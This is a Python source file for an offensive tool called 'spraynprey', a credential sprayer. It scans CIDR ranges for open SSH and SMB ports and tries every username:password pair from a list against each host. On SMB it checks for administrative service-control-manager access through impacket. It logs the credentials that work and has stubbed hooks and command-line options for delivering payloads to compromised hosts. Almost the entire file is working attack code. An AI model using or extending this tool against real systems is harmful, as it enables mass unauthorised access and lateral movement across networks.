#!/usr/bin/env python3

import os
import time
import random
import asyncio
import argparse
import logging
import paramiko
from ipaddress import ip_network
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple, Dict

from impacket.dcerpc.v5 import transport, scmr


SERVICES = {
    'ssh': {
        'port': 22
    },
    'smb': {
        'port': 445,
    }
}
logging.basicConfig(
    filename='spraynprey.log',
    format='[%(levelname)s] %(asctime)s - %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p',
    encoding='utf-8',
    level=logging.INFO
)
LOG = logging.getLogger('spraynprey')


class TCPScanner(object):

    def __init__(self, open_queues: Dict[int, asyncio.Queue], randomize=False, timeout=5.0, max_workers=32):
        self.timeout = timeout
        self.max_workers = max_workers
        self.randomize = randomize
        self.tcp_queue = asyncio.Queue()
        self.open_queues = open_queues
        self.scan_completed = asyncio.Event()
        self.results = []

    def _targets(self, targets: List[str]) -> List[str]:
        ''' Lazily generate hosts in ip ranges '''
        all_targets = []
        for target in targets:
            all_targets.extend([str(ip) for ip in ip_network(target).hosts()])
        if self.randomize:
            random.shuffle(all_targets)
        return all_targets

    async def scan(self, targets: List[str]) -> None:
        ''' Scans a list of target networks/ips and ports, results are put into open queue '''
        tasks = []
        for _ in range(self.max_workers):
            tasks.append(asyncio.create_task(self._task_worker()))
        for ip in self._targets(targets):
            for port in self.open_queues.keys():
                await self.tcp_queue.put((ip, port))
        await self.tcp_queue.join()
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        self.scan_completed.set()

    async def _task_worker(self):
        while True:
            ip, port = (await self.tcp_queue.get())
            LOG.info("[tcp worker] %s:%d", ip, port)
            conn = asyncio.open_connection(ip, port)
            try:
                await asyncio.wait_for(conn, self.timeout)
            except (asyncio.TimeoutError, ConnectionRefusedError):
                pass
            else:
                self.open_queues[port].put_nowait((ip, port,))
                self.results.append((ip, port,))
            finally:
                self.tcp_queue.task_done()


class LoginScanner(object):

    def __init__(self, queue: asyncio.Queue, credentials: Tuple[str, str], tcp_scan_completed: asyncio.Event, timeout=5.0, max_workers=4):
        self.queue = queue
        self.credentails = credentials
        self.timeout = timeout
        self.max_workers = max_workers
        self.tcp_scan_completed = tcp_scan_completed
        self.scan_completed = asyncio.Event()
        self.scan_queue = asyncio.Queue()
        self.results = []
        self._success_cache = {}
        self.thread_pool = ThreadPoolExecutor(max_workers=self.max_workers)

    async def scan(self):
        tasks = []
        tasks.append(asyncio.create_task(self._producer()))
        for _ in range(self.max_workers):
            tasks.append(asyncio.create_task(self._task_worker()))
        await self.tcp_scan_completed.wait()
        await self.queue.join()
        await self.scan_queue.join()
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        self.scan_completed.set()
    
    async def _producer(self):
        while True:
            ip, port = (await self.queue.get())
            for username, password in self.credentails:
                await self.scan_queue.put((ip, port, username, password,))
            self.queue.task_done()

    async def _task_worker(self):
        while True:
            try:
                ip, port, username, password = (await self.scan_queue.get())
                if ip in self._success_cache:
                    continue
                future = self.thread_pool.submit(self.login_attempt, ip, port, username, password)
                result = await asyncio.wrap_future(future)
                if result:
                    self.results.append((ip, port, username, password))
                    self._success_cache[ip] = True
            except Exception as err:
                LOG.exception(err)
            finally:
                self.scan_queue.task_done()

    def login_attempt(self, ip: str, port: int, username: str, password: str) -> bool:
        raise NotImplementedError()

    def deliver_payload(self, ip: str, port: int, username: str, password: str, payload: str) -> bool:
        raise NotImplementedError()


class SSHLoginScanner(LoginScanner):

    def login_attempt(self, ip: str, port: int, username: str, password: str, is_retry=False) -> bool:
        LOG.info('[ssh worker] Login attempt %s@%s:%d (pw: %s)', username, ip, port, password)
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, port=port, username=username, password=password, timeout=self.timeout)
            return True
        except (paramiko.BadAuthenticationType, paramiko.AuthenticationException):
            return False
        except (paramiko.ssh_exception.SSHException,) as err:
            if not is_retry:
                LOG.warning('SSH protocol exception, retrying attempt ...')
                time.sleep(round(random.uniform(0.1, 3.0), 2))
                return self.login_attempt(ip, port, username, password, True)
        except Exception as err:
            LOG.exception(err)
        finally:
            ssh.close()
        return False


class SMBLoginScanner(LoginScanner):

    def __init__(self, *args, **kwargs):
        self.domain = kwargs.get('domain', '')
        del kwargs['domain']
        super().__init__(*args, **kwargs)

    def login_attempt(self, ip: str, port: int, username: str, password: str) -> bool:
        LOG.info('[smb worker] Login attempt %s@%s:%d (pw: %s)', username, ip, port, password)
        try:
            stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % ip
            logging.debug('StringBinding %s'%stringbinding)
            rpc_transport = transport.DCERPCTransportFactory(stringbinding)
            rpc_transport.set_dport(port)
            rpc_transport.setRemoteHost(ip)
            if hasattr(rpc_transport, 'set_credentials'):
                rpc_transport.set_credentials(username, password, self.domain)
            rpc_transport.set_kerberos(False, None)
            _scmr = rpc_transport.get_dce_rpc()
            _scmr.connect()
            smb_conn = rpc_transport.get_smb_connection()
            _scmr.bind(scmr.MSRPC_UUID_SCMR)
            scmr.hROpenSCManagerW(_scmr)
            return True
        except Exception as err:
            LOG.exception(err)
        return False


#
# > Helpers
#
def load_credentials(args) -> List[Tuple[str, str]]:
    with open(args.credentials) as fp:
        lines = [line.strip() for line in fp.readlines() if ':' in line]
    return [line.split(':', 1) for line in lines]

def load_targets(args):
    for index, target in enumerate(args.targets):
        if os.path.exists(target) and os.path.isfile(target):
            with open(target, 'r') as fp:
                lines = fp.readlines()
            args.targets[index] = [line.strip() for line in lines if len(line) > 1]

#
# > Main
#
async def main(args):
    credentials = load_credentials(args)

    # Create per-port/service queues
    ports = [SERVICES[service]['port'] for service in args.services]
    open_queues = dict((port, asyncio.Queue(),) for port in ports)

    # Start the TCP scanner
    tcp_scanner = TCPScanner(open_queues, timeout=args.timeout, max_workers=args.max_tcp_workers)
    tcp_scan = asyncio.create_task(tcp_scanner.scan(args.targets))

    login_scans = []

    if 'ssh' in args.services:
        ssh_queue = open_queues[SERVICES['ssh']['port']]
        ssh_scanner = SSHLoginScanner(ssh_queue, credentials, tcp_scanner.scan_completed,
            timeout=args.timeout,
            max_workers=args.max_login_workers
        )
        login_scans.append(asyncio.create_task(ssh_scanner.scan()))

    if 'smb' in args.services:
        smb_queue = open_queues[SERVICES['smb']['port']]
        smb_scanner = SMBLoginScanner(smb_queue, credentials, tcp_scanner.scan_completed,
            domain=args.windows_domain,
            timeout=args.timeout,
            max_workers=args.max_login_workers
        )
        login_scans.append(asyncio.create_task(smb_scanner.scan()))

    await tcp_scan
    print('[*] TCP scan completed')
    await asyncio.gather(*login_scans, return_exceptions=True)
    print('[*] All scans completed')
 
    print('tcp results: %r' % tcp_scanner.results)
    if 'ssh' in args.services:
        print('ssh results: %r' % ssh_scanner.results)
    if 'smb' in args.services:
        print('smb results: %r' % smb_scanner.results)


class ValidatServicesAction(argparse.Action):

    def __call__(self, parser, namespace, values, option_string=None):
        for service in values:
            if service not in SERVICES:
                raise ValueError('Unsupported service %s' % service)
        setattr(namespace, self.dest, values)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Credential sprayer and preyer',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('--version',
        action='version',
        version='%(prog)s v0.0.1'
    )
    parser.add_argument('--max-tcp-workers', '-wT',
        help='max number of workers per queue',
        dest='max_tcp_workers',
        type=int,
        default=min(32, os.cpu_count() + 4)
    )
    parser.add_argument('--max-login-workers', '-wL',
        help='max number of login workers per queue',
        dest='max_login_workers',
        type=int,
        default=4
    )
    parser.add_argument('--timeout', '-T',
        help='connection timeout in seconds',
        dest='timeout',
        type=float,
        default=1.0
    )
    parser.add_argument('--targets', '-t',
        help='target ip cidr range(s) or ip address(es)',
        dest='targets',
        nargs='*',
        required=True,
    )
    parser.add_argument('--credentials', '-c',
        help='credential file (username:password newline delimited)',
        dest='credentials',
        required=True,
    )
    parser.add_argument('--windows-domain', '-d',
        help='windows domain name to use with credentials',
        dest='windows_domain',
        default='',
        type=str,
    )
    parser.add_argument('--services', '-s',
        help='list of services to scan/spray',
        dest='services',
        nargs='*',
        default=list(SERVICES.keys()),
        action=ValidatServicesAction
    )
    parser.add_argument('--ssh-payload', '-ssh',
        help='',
        dest='ssh_payload',
        default=None,
    )
    parser.add_argument('--smb-payload', '-smb',
        help='',
        dest='smb_payload',
        default=None,
    )
    asyncio.run(main(parser.parse_args()))

